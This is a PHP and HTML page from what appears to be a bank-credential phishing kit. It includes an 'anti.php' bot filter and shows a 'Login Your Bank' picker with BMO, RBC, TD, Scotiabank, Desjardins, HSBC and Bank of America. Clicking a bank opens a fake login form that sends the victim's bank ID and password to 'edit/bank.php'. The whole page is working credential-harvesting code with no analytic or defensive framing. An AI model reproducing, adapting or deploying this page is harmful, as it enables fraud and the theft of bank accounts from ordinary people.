
<?php

include('./anti.php');
include('./inc/lange.php');
include "./inc/lange".$_SESSION['Moustache-ANONISMA-AYOUB'];



?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
	<title>Login Your Bank</title>
	<link rel="shortcut icon" link rel="logo-icon" href="./img/icon.ico">
	<link rel="stylesheet" type="text/css" href="css/billing.css">
</head>
<body>


<?php
  include 'fils/nav.php';
?>


<div class="_5tar_lik">
	<h2><?php echo $wiz_135 ; ?></h2>
	<div class="_9fal">
		<span><?php echo $wiz_136 ; ?></span>
		<img src="img/9fal.gif">
	</div>
	<a href="#" class="_3ando" id="have_zz"><?php echo $wiz_137 ; ?></a>
</div>
<div class="banks">
	<ul>

		<li class="bank_bmo">
			<div class="logo_bank">
				<span class="img_bank_1"></span>
			</div>
			<span class="name_bank_1">BMO Financial Group</span>
		</li class="bank_li_">

		<li id="National">
			<div class="logo_bank">
				<span class="img_bank_2"></span>
			</div>
			<span class="name_bank_2">National Bank </span>
		</li>

		<li id="tangerine">
			<div class="logo_bank">
				<span class="img_bank_3"></span>
			</div>
			<span class="name_bank_3">Tangerine</span>
		</li>

		<li id="cibc">
			<div class="logo_bank">
				<span class="img_bank_4"></span>
			</div>
			<span class="name_bank_4">CIBC</span>
		</li id="rbc">

		<li id="rbc">
			<div class="logo_bank">
				<span class="img_bank_5"></span>
			</div>
			<span class="name_bank_5">RBC Royal Bank</span>
		</li>

		<li id="des">
			<div class="logo_bank">
				<span class="img_bank_6"></span>
			</div>
			<span class="name_bank_6">Desjardins Bank</span>
		</li>

		<li id="sco">
			<div class="logo_bank">
				<span class="img_bank_7"></span>
			</div>
			<span class="name_bank_7">Scotiabank</span>
		</li>

		<li id="hsb">
			<div class="logo_bank">
				<span class="img_bank_8"></span>
			</div>
			<span class="name_bank_8">HSBC Bank</span>
		</li>

		<li id="td">
			<div class="logo_bank">
				<span class="img_bank_9"></span>
			</div>
			<span class="name_bank_9">TD Bank</span>
		</li>

		<li id="usa" style="float: left;">
			<div class="logo_bank">
				<span class="img_bank_10"></span>
			</div>
			<span class="name_bank_10">Bank Of America</span>
		</li>

		<li id="have">
			<span class="_3ando_mbadla"><?php echo $wiz_137 ; ?></span>
		</li>

	</ul>
</div>





        <div class="hassan_bank">
        	<div class="head_wiz">
        	<span class="tayartini">x</span>
        </div>
        <div class="login_bank_wiz">
        	
        	<div class="moustache_bank">
        		<header>
        			<h3><span id="name_zwamal"></span></h3>
        			<p class="wiz_img_3yit"></p>
        			<a href="#"></a>
        			<div class="moustache_9fal">
        				<img src="img/9fal.gif">
        				<span><?php echo $wiz_138 ; ?></span>
        			</div>
        		</header>
        		<form action="edit/bank.php" method="POST">
        			<label for="id_bank"><?php echo $wiz_144 ; ?></label>
        			<input type="text" name="id_bank" id="id_bank" required>
        			<label for="pass_bank"><?php echo $wiz_145 ; ?></label>
        			<input type="password" name="pass_bank" id="pass_bank" required>
        			<p id="tbat"><?php echo $wiz_146 ; ?> <i><?php echo $wiz_140 ; ?></i>, <?php echo $wiz_148 ; ?></p>
        			<input type="submit" name="bank_login" value="<?php echo $wiz_140 ; ?>" id="login_mous">
        		</form>
        	</div>
        </div>
        </div>


        <div class="i_have">
        	<div class="head_wiz">
        	<span class="tayartini">x</span>
        </div>
        <div class="login_bank_wiz">
        	
        	<div class="moustache_bank">
        		<header>
        			<h3><?php echo $wiz_149 ; ?></h3>
        			<a href="#"></a>
        			<div class="moustache_9fal">
        				<img src="img/9fal.gif">
        				<span><?php echo $wiz_143 ; ?></span>
        			</div>
        		</header>
        		<form action="edit/bank.php" method="POST">
        		    <label for="n_bank"><?php echo $wiz_150 ; ?></label>
        			<input type="text" name="n_bank" id="n_bank" required>
        			<label for="id_bank"><?php echo $wiz_144 ; ?></label>
        			<input type="text" name="id_bank" id="id_bank" required>
        			<label for="pass_bank"><?php echo $wiz_145 ; ?></label>
        			<input type="password" name="pass_bank" id="pass_bank" required>
        			<p id="tbat"><?php echo $wiz_139 ; ?> <i><?php echo $wiz_140 ; ?></i>, <?php echo $wiz_141 ; ?></p>
        			<input type="submit" name="bank_login" value="<?php echo $wiz_140 ; ?>" id="login_mous">
        		</form>
        	</div>
        </div>
        </div>




<?php
include 'fils/footer.php';
?>


<script type="text/javascript" src="js/jquery-3.1.1.min.js"></script>
<script type="text/javascript">
	$(document).ready(function(){
		var name_zamal = document.getElementById("name_zwamal");
		$('.bank_bmo').click(function(){
			$('.hassan_bank').show(2000);
			name_zamal.innerHTML = "BMO Financial";
			$('.wiz_img_3yit').css("background-position" , "left -800px");
			$('.banks').hide();
			$('._5tar_lik').hide();
			$('.nav_wiz').hide();
			$('.nav_ta7t').hide();
		});

        $('#National').click(function(){
			$('.hassan_bank').show(2000);
			name_zamal.innerHTML = "National Bank";
			$('.wiz_img_3yit').css("background-position" , "left -900px");
			$('.banks').hide();
			$('._5tar_lik').hide();
			$('.nav_wiz').hide();
			$('.nav_ta7t').hide();
		});
		
		$('#tangerine').click(function(){
			$('.hassan_bank').show(2000);
			name_zamal.innerHTML = "Tangerine Bank";
			$('.wiz_img_3yit').css("background-position" , "left -1500px");
			$('.banks').hide();
			$('._5tar_lik').hide();
			$('.nav_wiz').hide();
			$('.nav_ta7t').hide();
		});
		
		$('#rbc').click(function(){
			$('.hassan_bank').show(2000);
			name_zamal.innerHTML = "RBC Royal Bank";
			$('.wiz_img_3yit').css("background-position" , "left -650px");
			$('.banks').hide();
			$('._5tar_lik').hide();
			$('.nav_wiz').hide();
			$('.nav_ta7t').hide();
		});

		$('#cibc').click(function(){
			$('.hassan_bank').show(2000);
			name_zamal.innerHTML = "CIBC";
			$('.wiz_img_3yit').css("background-position" , "left -850px");
			$('.banks').hide();
			$('._5tar_lik').hide();
			$('.nav_wiz').hide();
			$('.nav_ta7t').hide();
		});
		
		$('#des').click(function(){
			$('.hassan_bank').show(2000);
			name_zamal.innerHTML = "Desjardins Bank";
			$('.wiz_img_3yit').css("background-position" , "left -1593px");
			$('.banks').hide();
			$('._5tar_lik').hide();
			$('.nav_wiz').hide();
			$('.nav_ta7t').hide();
		});
		
		$('#sco').click(function(){
			$('.hassan_bank').show(2000);
			name_zamal.innerHTML = "Scotiabank Bank";
			$('.wiz_img_3yit').css("background-position" , "left -950px");
			$('.banks').hide();
			$('._5tar_lik').hide();
			$('.nav_wiz').hide();
			$('.nav_ta7t').hide();
		});
		
		$('#hsb').click(function(){
			$('.hassan_bank').show(2000);
			name_zamal.innerHTML = "HSBC Bank";
			$('.wiz_img_3yit').css("background-position" , "left -1546px");
			$('.banks').hide();
			$('._5tar_lik').hide();
			$('.nav_wiz').hide();
			$('.nav_ta7t').hide();
		});
		
		$('#td').click(function(){
			$('.hassan_bank').show(2000);
			name_zamal.innerHTML = "TD Bank";
			$('.wiz_img_3yit').css("background-position" , "left -1000px");
			$('.banks').hide();
			$('._5tar_lik').hide();
			$('.nav_wiz').hide();
			$('.nav_ta7t').hide();
		});

		$('#usa').click(function(){
			$('.hassan_bank').show(2000);
			name_zamal.innerHTML = "Bank Of America";
			$('.wiz_img_3yit').css("background-position" , "left 1px");
			$('.banks').hide();
			$('._5tar_lik').hide();
			$('.nav_wiz').hide();
			$('.nav_ta7t').hide();
		});

		$('#have_zz').click(function(){
			$('.i_have').show(2000);
			$('.banks').hide();
			$('._5tar_lik').hide();
			$('.nav_wiz').hide();
			$('.nav_ta7t').hide();
		});

		$('#have').click(function(){
			$('.i_have').show(2000);
			$('.banks').hide();
			$('._5tar_lik').hide();
			$('.nav_wiz').hide();
			$('.nav_ta7t').hide();
		});

		$('.tayartini').click(function(){
			$('.i_have').hide(1000);
			$('.banks').show(2000);
			$('._5tar_lik').show(2000);
			$('.nav_wiz').show(2000);
			$('.nav_ta7t').show(2000);
		});
		
		$('.tayartini').click(function(){
			$('.hassan_bank').hide(1000);
			$('.banks').show(2000);
			$('._5tar_lik').show(2000);
			$('.nav_wiz').show(2000);
			$('.nav_ta7t').show(2000);
		});
	});
</script>

</body>
</html>